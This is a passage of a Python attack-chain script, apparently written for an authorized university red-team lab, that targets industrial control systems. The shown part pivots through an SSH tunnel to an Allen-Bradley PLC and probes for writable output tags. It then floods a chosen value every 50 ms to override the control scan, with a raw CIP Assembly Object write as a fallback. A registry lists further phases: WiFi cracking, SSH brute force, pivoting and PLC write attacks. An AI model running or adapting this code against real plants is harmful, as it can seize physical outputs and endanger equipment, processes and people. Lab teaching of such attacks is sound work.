    # ── Raw CIP generic message fallback parameters ────────────────────────────
    # Service 0x10 = Set_Attribute_Single, Class 0x04 = Assembly Object
    CIP_SERVICE   = 0x10
    CIP_CLASS     = 0x04
    CIP_INSTANCES = [100, 101, 102, 104]
    CIP_ATTRIBUTE = 3

    console.print(Panel(
        f"[bold white]Target     :[/bold white] [bold yellow]{plc_ip}[/bold yellow]  "
        f"(via tunnel 127.0.0.1:{LOCAL_PORT})\n"
        f"[bold white]Module     :[/bold white] 1734-OE2C / Point I/O output rack\n"
        f"[bold white]Strategy   :[/bold white] Tag write → raw CIP Assembly Object fallback\n"
        f"[bold white]Fire rate  :[/bold white] 50 ms  (20 Hz — outruns PLC scan cycle)\n"
        f"[dim]Press [bold]Ctrl-C[/bold] to stop the injection loop and exit cleanly.[/dim]",
        title="[bold red] Direct I/O Injector [/bold red]",
        border_style="red", expand=False,
    ))

    console.print()
    inject_raw = Prompt.ask(
        "[yellow]Value to inject (integer, e.g. 100)[/yellow]",
        default="100",
    ).strip()
    try:
        inject_value = int(inject_raw)
    except ValueError:
        r.status  = "failed"
        r.finding = f"Invalid inject value: {inject_raw!r}"
        err(r.finding)
        return r

    tunnel_proc: "subprocess.Popen | None" = None
    key_file:    "str | None"              = None

    try:
        # ── Ghost-process cleanup then open tunnel ────────────────────────────
        run_cmd("pkill -f 'ssh -W' 2>/dev/null || true",          capture=False)
        run_cmd("pkill -f 'ssh -N -L 44818' 2>/dev/null || true", capture=False)

        hist_ip   = CFG["historian"]["ip"]
        hist_user = CFG["historian"]["username"]
        hist_pass = CFG["historian"]["password"]
        ids_ip    = CFG["ids"]["ip"]
        ids_user  = CFG["ids"]["username"]
        ids_pass  = CFG["ids"]["password"]
        ids_pkey  = CFG["ids"].get("private_key")

        info(f"Opening ssh -L tunnel  127.0.0.1:{LOCAL_PORT} → {ids_ip} → {plc_ip}:{LOCAL_PORT}")
        tunnel_proc, key_file = _open_cip_tunnel(
            hist_ip, hist_user, hist_pass,
            ids_ip,  ids_user,  ids_pass, ids_pkey,
            plc_ip,  LOCAL_PORT,
        )
        info("Waiting 4 s for tunnel to stabilise...")
        time.sleep(4)
        if tunnel_proc.poll() is not None:
            stderr_out = tunnel_proc.stderr.read(2048).decode(errors="replace").strip()
            raise RuntimeError(
                f"SSH tunnel exited immediately (rc={tunnel_proc.returncode})\n{stderr_out}"
            )
        ok(f"Tunnel live  127.0.0.1:{LOCAL_PORT} → {plc_ip}")

        # ── Connect via slot hunt ─────────────────────────────────────────────
        CIP_SLOTS = ["", "/0", "/1", "/2", "/3"]
        plc_conn  = None
        for slot in CIP_SLOTS:
            path = f"127.0.0.1{slot}"
            info(f"Trying CIP path {path!r}...")
            drv = LogixDriver(path, init_info=False)
            try:
                drv.open()
                plc_conn = drv
                ok(f"Connected at {path!r}")
                break
            except Exception as e:
                warn(f"  {path!r} → {e}")
                try: drv.close()
                except Exception: pass

        if plc_conn is None:
            raise RuntimeError("All CIP slot paths failed — verify tunnel and PLC power")

        try:
            # ── Discover which output tag exists on this rack ─────────────────
            working_tag: str | None = None
            for candidate in OUTPUT_TAGS:
                info(f"Probing tag {candidate!r}...")
                result = plc_conn.read(candidate)
                if result is not None and result.error is None:
                    working_tag = candidate
                    ok(f"Output tag confirmed: [bold]{working_tag}[/bold]  "
                       f"(current value: {result.value})")
                    break
                warn(f"  {candidate!r} → not found or access denied")

            # ── Injection loop ────────────────────────────────────────────────
            shots = 0
            if working_tag:
                console.print(Panel(
                    f"[bold white]Tag        :[/bold white] [bold yellow]{working_tag}[/bold yellow]\n"
                    f"[bold white]Injecting  :[/bold white] [bold red]{inject_value}[/bold red]  "
                    f"every 50 ms\n"
                    f"[dim]Ctrl-C to stop[/dim]",
                    title="[bold red] ⚡ INJECTION ACTIVE [/bold red]",
                    border_style="red", expand=False,
                ))
                try:
                    while True:
                        res = plc_conn.write((working_tag, inject_value))
                        shots += 1
                        if shots % 20 == 0:   # status line every 1 s
                            ok(f"  {shots} writes fired → {working_tag} = {inject_value}")
                        time.sleep(0.05)
                except KeyboardInterrupt:
                    console.print("\n  [yellow][!] Injection stopped by operator[/yellow]")

            else:
                # ── Raw CIP Assembly Object fallback ─────────────────────────
                warn("No tag write succeeded — falling back to raw CIP Assembly Object writes")

                # Encode value as UINT (2 bytes, little-endian)
                raw_bytes = inject_value.to_bytes(2, byteorder="little", signed=False)

                working_instance: int | None = None
                for instance in CIP_INSTANCES:
                    info(f"Trying CIP generic: service=0x{CIP_SERVICE:02X} "
                         f"class=0x{CIP_CLASS:02X} instance={instance} attr={CIP_ATTRIBUTE}")
                    try:
                        resp = plc_conn.generic_message(
                            service=CIP_SERVICE,
                            class_code=CIP_CLASS,
                            instance=instance,
                            attribute=CIP_ATTRIBUTE,
                            request_data=raw_bytes,
                            connected=False,
                            unconnected_send=True,
                            route_path=True,
                        )
                        if resp and not resp.error:
                            working_instance = instance
                            ok(f"Raw CIP write accepted — instance {instance}")
                            break
                        warn(f"  instance {instance} → {resp.error if resp else 'no response'}")
                    except Exception as cip_err:
                        warn(f"  instance {instance} → {cip_err}")

                if working_instance is not None:
                    console.print(Panel(
                        f"[bold white]CIP Instance :[/bold white] {working_instance}\n"
                        f"[bold white]Injecting    :[/bold white] [bold red]{inject_value}[/bold red]  "
                        f"(0x{inject_value:04X})  every 50 ms\n"
                        f"[dim]Ctrl-C to stop[/dim]",
                        title="[bold red] ⚡ RAW CIP INJECTION ACTIVE [/bold red]",
                        border_style="red", expand=False,
                    ))
                    try:
                        while True:
                            plc_conn.generic_message(
                                service=CIP_SERVICE,
                                class_code=CIP_CLASS,
                                instance=working_instance,
                                attribute=CIP_ATTRIBUTE,
                                request_data=raw_bytes,
                                connected=False,
                                unconnected_send=True,
                                route_path=True,
                            )
                            shots += 1
                            if shots % 20 == 0:
                                ok(f"  {shots} raw CIP writes fired → instance {working_instance}")
                            time.sleep(0.05)
                    except KeyboardInterrupt:
                        console.print("\n  [yellow][!] Injection stopped by operator[/yellow]")
                else:
                    raise RuntimeError(
                        "All output tags and raw CIP instances failed — "
                        "verify rack addressing or try a different Instance ID"
                    )

            r.status  = "success"
            r.finding = f"{shots} writes fired  →  value={inject_value}"
            ok(r.finding)

        finally:
            try: plc_conn.close()
            except Exception: pass

    except KeyboardInterrupt:
        console.print("\n  [yellow][!] Phase interrupted by operator[/yellow]")
        r.status  = "skipped"
        r.finding = "Interrupted by operator"
    except Exception as e:
        r.status  = "failed"
        r.finding = str(e)
        err(str(e))
    finally:
        if tunnel_proc and tunnel_proc.poll() is None:
            tunnel_proc.terminate()
            info("SSH tunnel closed")
        if key_file and os.path.exists(key_file):
            os.remove(key_file)

    return r


# ── Final report ──────────────────────────────────────────────────────────────

def print_report():
    console.print()
    console.rule("[bold white]Attack Chain Report[/bold white]")

    STATUS_STYLE = {
        "success": ("green",  " SUCCESS"),
        "failed":  ("red",    " FAILED "),
        "skipped": ("yellow", " SKIPPED"),
        "pending": ("dim",    " PENDING"),
    }

    table = Table(show_header=True, header_style="bold magenta", border_style="dim")
    table.add_column("#",       style="dim",   width=3)
    table.add_column("Phase",   style="cyan",  width=26)
    table.add_column("Status",  width=10)
    table.add_column("Finding", width=54)

    for i, r in enumerate(results, 1):
        color, label = STATUS_STYLE.get(r.status, ("white", r.status.upper()))
        table.add_row(
            str(i),
            r.phase,
            f"[bold {color}]{label}[/bold {color}]",
            r.finding,
        )

    console.print(table)

    report_path = f"/tmp/incs4810_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    data = [
        {"phase": r.phase, "status": r.status,
         "finding": r.finding, "ts": r.ts, "output": r.output}
        for r in results
    ]
    with open(report_path, "w") as f:
        json.dump(data, f, indent=2)

    ok(f"Full JSON report saved: {report_path}")


# ── Phase registry ────────────────────────────────────────────────────────────

PHASES = [
    (1, "WiFi AP Crack",              phase1_wifi_crack),
    (2, "IDMZ Recon",                 phase2_idmz_recon),
    (3, "SSH Brute Force",            phase3_ssh_bruteforce),
    (4, "SSH Pivot / OT Recon",       phase4_ssh_pivot),
    (5, "CIP Recon — PLC Map",        phase5_cip_enum),
    (6, "PLC CIP Write Attack",       phase5_plc_attack),
    (7, "Defense Validation",         phase6_defense_check),
    (8, "Direct Remote I/O Inject",   phase8_direct_io_inject),
]


# ── Entry point ───────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="INCS 4810 Red Team Chain — BCIT Authorized Lab"
    )
    parser.add_argument(
        "--phases", nargs="*", type=int,
        help="Run specific phases only, e.g. --phases 2 3 4"
    )
    parser.add_argument(
        "--auto", action="store_true",
        help="Skip per-phase confirmation prompts"
    )
    args = parser.parse_args()

    banner()
    preflight_check()

    selected   = set(args.phases) if args.phases else {n for n, _, _ in PHASES}
    chain_start = time.monotonic()

    for n, title, fn in PHASES:
        if n not in selected:
            results.append(PhaseResult(title, status="skipped", finding="Not selected"))
            continue

        if not args.auto and not confirm_phase(f"Phase {n}/{len(PHASES)}: {title}"):
            results.append(PhaseResult(title, status="skipped", finding="Skipped by operator"))
            continue

        while True:
            phase_start = time.monotonic()
            r = fn()
            phase_elapsed = time.monotonic() - phase_start

            status_color = "green" if r.status == "success" else "red" if r.status == "failed" else "yellow"
            console.print(
                f"\n[dim]Phase {n} complete — "
                f"[{status_color}]{r.status.upper()}[/{status_color}]  "
                f"elapsed [bold]{phase_elapsed:.1f}s[/bold][/dim]"
            )

            if r.status != "failed" or args.auto:
                break   # success / skipped, or auto mode — move on

            console.print()
            choice = Prompt.ask(
                "[red]Phase failed[/red] — what next?",
                choices=["r", "c", "q"],
                default="c",
            )
            console.print("[dim]  r = retry  |  c = continue to next phase  |  q = quit[/dim]")

            if choice == "r":
                warn(f"Retrying Phase {n}: {title} ...")
                continue        # re-run fn()
            elif choice == "q":
                results.append(r)
                console.print("[bold red]Aborted by operator.[/bold red]")
                chain_elapsed = time.monotonic() - chain_start
                console.print(f"\n[dim]Total chain elapsed: [bold]{chain_elapsed:.1f}s[/bold][/dim]")
                print_report()
                return
            else:
                break           # continue to next phase

        results.append(r)

    chain_elapsed = time.monotonic() - chain_start
    console.print(f"\n[dim]Total chain elapsed: [bold]{chain_elapsed:.1f}s[/bold][/dim]")
    print_report()


if __name__ == "__main__":
    main()
